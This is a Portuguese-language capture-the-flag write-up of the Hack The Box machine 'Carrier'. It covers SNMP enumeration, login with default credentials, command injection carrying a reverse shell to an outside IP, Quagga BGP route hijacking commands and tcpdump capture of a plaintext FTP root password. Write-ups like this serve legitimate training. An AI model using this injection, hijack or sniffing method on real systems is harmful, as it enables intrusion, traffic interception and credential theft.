---
title: "Hack The Box - Carrier"
tags: [Linux,Medium,Gobuster,BurpSuite,Wireshark,BGP Hijacking]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/155>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

Nmap TCP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_nmap.png)

Nmap UDP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -sU --> Portas UDP

> --max-retries=0 --> O máximo de tentativa é 1 (ir mais rápido)

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 - Servidor SSH

> Porta 80 - Servidor Web

> Porta 161 (UDP) - Servidor SNMP

## Enumeração da Porta 161 (UDP)

Bom, por ser um servidor NMAP rodando nessa máquina vamos tentar enumerar...

`snmpwalk -c public -v 1 10.10.10.105`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_snmp.png)

"SN#NET_45JDX23" -- Possivelmente o serial number de algo, vamos guardar isso para usar depois

## Enumeração da Porta 80

Por se tratar de um servidor web, a primeira coisa que fazemos é acessar ele pelo navegador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web.png)

Vamos rodar o Gobuster nela pra ver se encontramos algo interessante

### Gobuster na Porta 80

`gobuster dir -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_gobuster.png)

Encontramos bastante coisa bacana... vamos iniciar a verificar isso agora

### /doc

Acessando o diretório `/doc`, temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web1.png)

Dois documentos, um `pdf` e um `png`

O png pelo que parece é um esquema de roteamento

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web2.png)

O pdf me parece ser uma tabela de códigos de erro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web3.png)

O que chamou atenção foi o erro `45009` que diz `System credentials have not been set. Default admin user password is set (see chassis serial number)`, bom, nós temos um serial number que foi pego na enumeração do servidor SNMP, então já é um bom ponto de início

### Logando na aplicação

Bom, uma vez com login, vamos tentar nos autenticar no sistema

admin:NET_45JDX23

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web4.png)

Sucesso!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web5.png)

Dentro da página logada, clicamos em `Diagnostics`, e depois em `Verify Status`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_web6.png)

Muito interessante, pelo que parece, é a saida do comando `ps aux`

## Identificando RCE

Bom, vamos jogar essa página para o BurpSuite, lá podemos verificar com mais calma pra ver o que está acontecendo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp1.png)

Mandamos pro Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp2.png)

Depois de um tempo olhando o comportamento da aplicação, verificamos que o parâmetro `check` é um base64 `check=cXVhZ2dh`

Verificamos do que se trata é `quagga` em base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp3.png)

Roteamento dinâmico, interessante...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp4.png)

Pra conseguir RCE aqui é relativamente simples, uma vez que está sendo executado comandos, se colocarmos `root` serão mostrados os processos de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp6.png)

Agora, se colocarmos `root; bash -i >& /dev/tcp/10.10.16.3/443 0>&1` serão executados os dois comandos

# Ganhando Shell de root em r1

Então vamos lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp7.png)

Executamos (Lembrar de dar URL Encode - Control + U - pq tem chars ai que devem ser encodados)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp8.png)

Recebemos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_burp9.png)

Bom agora vamos iniciar a enumeração dessa máquina

## Verificando as interfaces

Se lembrarmos lá na página web, tinha uma aba `Tickets` que nos trazia inofrmações sobre a rede

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic.png)

Hum... ele fala de outras redes que tem, vamos verificar as interfaces de rede dessa máquina então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic1.png)

Bom, verificamos que temos 3 interfaces mais a loopback. 

10.99.0.0 é o AS100, então 10.99.64.2 deve ser endereço interno. 10.78.10.1 e 10.78.11.1 deve ser ponto a ponto com os outros dois AS's. Vamos verificar o arquivo de configuração do BGP pra confirmar ou refutar isso

`cat /etc/quagga/bgpd.conf`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic2.png)

```
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

Realmente fez sentido.

## Verificando as rotas

Vamos agora verificar as rotas que a máquina faz, quem está na "vizinhança" dela

10.100.0.0/16 vai pra 10.78.10.2, que é o AS200 / Zaza Telecom.

10.120.0.0/15 vai pra 10.78.11.2, que é o AS300 / CastCom.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic3.png)

## Escaneamento da rede alvo

Agora vamos analisar as redes disponíveis e qual será nosso alvo

> 10.99.64.1 - SSH, FTP, and web, é o host

> 10.99.64.2, .3, .4 - Routers, SSH and BGP; .2 é o que eu estou agora

> 10.99.64.251 - web and ssh; lyghtspeed page

Me baseando no ticket do site, a rede que eu quero é a 10.120.15.0/24. Pelo que o ticket falou lá tem informações importantes no FTP que está sendo executado lá

Vamos fazer um simples `Ping Sweep` pra comprovar que ele está ativo

`time for i in $(seq 1 254); do (ping -c 1 10.120.15.${i} | grep "bytes from" &); done;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic4.png)

Bom, para o escaneamento dessa máquina vamos utilizar do `nmap`, no caso a partir de um Binary Static, uma vez que ele não está disponível na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic6.png)

Baixamos o nmap para nossa máquina

> https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic7.png)

Passamos pra máquina Carrier

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic8.png)

Agora executamos ele no host 10.120.15.1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic10.png)

Agora executamos ele no host 10.120.15.10

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic9.png)

Realmente confirmamos, temos o servidor FTP no host 10.120.15.10

O diagrama da rede ficou assim (copiei do 0xdf - ficou muito bem montado)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic11.png)

# Explorando BGP Hijacking

A partir desse momento que a máquina ao meu ver ficou extramente complexa... Nível brainfuck mesmo, pq eu não tenho muito essas noções necessárias pro pleno entendimento do que está acontecendo, mas vamos lá.

A ideia aqui é eu "roubar" o tráfego que vem de algum lugar do AS200 (que possivelmente tem um usuário querendo acessar o FTP no AS300) que está indo para o AS300 (10.120.15.10) e vai passar por mim.

A minha rota tem que ser mais específica que a outra, pra ele preferir vir pra mim. Eu vou avisar (advertise) a rota 10.120.15.0/25, eu vou dizer a minha rota 10.120.15.0-127 é mais específica que a 10.120.15.0-255. Uma vez que consegui fazer isso, vou esperar o usuário no AS200 fazer a conexão, não vou dividar essa rota com o AS300.

A ideia a muuuuito grosso modo é essa, uma pessoa vai acessar o servidor FTP pelo meu router, e eu vou roubar esse tráfego e essa credencial em plaintext

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic12.png)

Bom vamos lá...

## Desativando Cron

Verificando as crons, temos um script que reseta as configurações a cada 10 min, isso é muito bom, pq se eu fizer merda, ele vai corrigir, mas enquanto estivermos trabalhando, não quero que as coisas sejam resetadas, então vou tirar ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic13.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic15.png)

Desativamos a opção dele ser executável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_tic14.png)

## Verificando as configurações

Vamos ver como estão as configurações atuais do roteador, para isso entramos no modo console, através do comando `vtysh` e depois rodar o comando `show running-config`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config.png)

A parte que me interessa é essa

```
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
 !
 route-map to-as200 permit 10
 !
 route-map to-as300 permit 10
```

Ela diz a respeito do neighbors, ela está dizendo onde cara rota vai ser dividida com a vizinhança. No caso que está agora todas as rotas são divididas com os vizinhos.

## Hijacking

Agora vamos entrar no modo de configuração do terminal e fazer as alterações necessárias

`configure terminal`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config1.png)

Agora, vamos definir um `prefix-list` que vai bater com o range que eu tenho como alvo

> ip prefix-list CARRIER permit 10.120.15.0/25

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config2.png)

Agora vamos dar umas regras para a tabela de roteamento. Vou iniciar com o to-as200, essa é a rota que eu quero advertise, mas não quero que essa rota essa passada pra outros roteadores. Vai checar se o ip está la lista, se sim, vai receber o `no-export`

````
route-map to-as200 permit 10
match ip address prefix-list CARRIER
set community no-export
````

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config3.png)

Agora vou definir o que acontece com a prioridade 20, isso pra qualquer rota que não bater com o ip prefix-list, e é simples, apenas permitir com nada de especial

`route-map to-as200 permit 20`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config4.png)

Então o que vai acontecer até agora. Cada roda vai checar a regra com prioridade 10, se bater com o ip do prefix-list, vai receber a no-export tag, não vai dividir a rota. Se não bater, vai seguir o fluxo normal, pq não tem nada de diferente configurado

Agora vamos mudar para o roteador AS-300. Esse router não deve pegar meu adversitement. Então vou colocar prioridade 10 como negado, mas somente se bater com meu prefix-list

```
route-map to-as300 deny 10
match ip address prefix-list CARRIER
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config5.png)

Agora vou setar como prioridade 20 pra ser liberado

`route-map to-as300 permit 20`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config6.png)

Vou voltar de contexto para editar o bgp e adicionar a rede para ser advsertise

```
router bgp 100
network 10.120.15.0 mask 255.255.255.128
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config7.png)

É interessante notarmos que uma implementação BGE geralmente verifica se a rota realmente está na tabela de roteamento antes de sair injetando ela por ai, mas Quagga não liga pra isso

Agora, finalmente, vou sair da configuração e dar um reset para a configuração ser colocada no lugar dela

```
end
clear ip bgp *
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config8.png)

Agora verifico minha rota sendo mandada pra AS-200

`show ip bgp neighbors 10.78.10.2 advertised-routes`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_config9.png)

Nenhuma rota ta indo pra 10.78.11.2! Essa é a ideia, todo tráfego passa por mim, como se fosse um MITM

## Sniffing na rede

Agora realizamos o sniffing na rede com o tcpdump, é pra ele capturar as credenciais, uma vez que eu tenho como rota a minha máquina

`tcpdump -i any -w ftp.cap port 21`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_cap.png)

Passo o arquivo para base64 pra poder passar pra minha Kali

`base64 ftp.cap`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_cap1.png)

Agora na Kali eu decodifico o base64

`base64 -d ftp.b64 > ftp.cap`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_cap2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_cap3.png)

Agora abro no Wireshark

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_cap4.png)

Verifico as credenciais (Clicando com o botão direito em qualquer pacote FTP e indo em Follow TCP Stream)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_cap5.png)

```
220 (vsFTPd 3.0.3)
USER root
331 Please specify the password.
PASS BGPtelc0rout1ng
230 Login successful.
SYST
215 UNIX Type: L8
TYPE I
200 Switching to Binary mode.
PASV
227 Entering Passive Mode (10,120,15,10,122,187).
STOR secretdata.txt
150 Ok to send data.
226 Transfer complete.
QUIT
221 Goodbye.
```

Ai está a senha do FTP, que também é a do SSH do root

# Acessando como root

Uma vez com a senha do root, fazemos login SSH na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_ssh.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_root.png)

# Algo a mais

Poderíamos ter feito de maneira diferente esse "hijacking" do FTP, poderiamos nos ter feito passar como se fosse o host, isso da certo pq na bucha todas as máquinas são o mesmo host. Eu posso pegar o dado do FTP apenas me passando pelo servidor que iria receber a conexão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_int.png)

E agora, escutaria todo o tráfego pelo nc

No caso eu simulei a conexão, assim que fui conectado fui enviando os parâmetros, `220 (teste)`, depois, `331 Please specify the password.`, e por último `230 Login successful.`, o resto não é necessário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_int1.png)

Agora eu retorno a interface para o endereço de IP dela

`ifconfig eth2 10.78.11.1 netmask 255.255.255.0`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-carrier/C_int2.png)

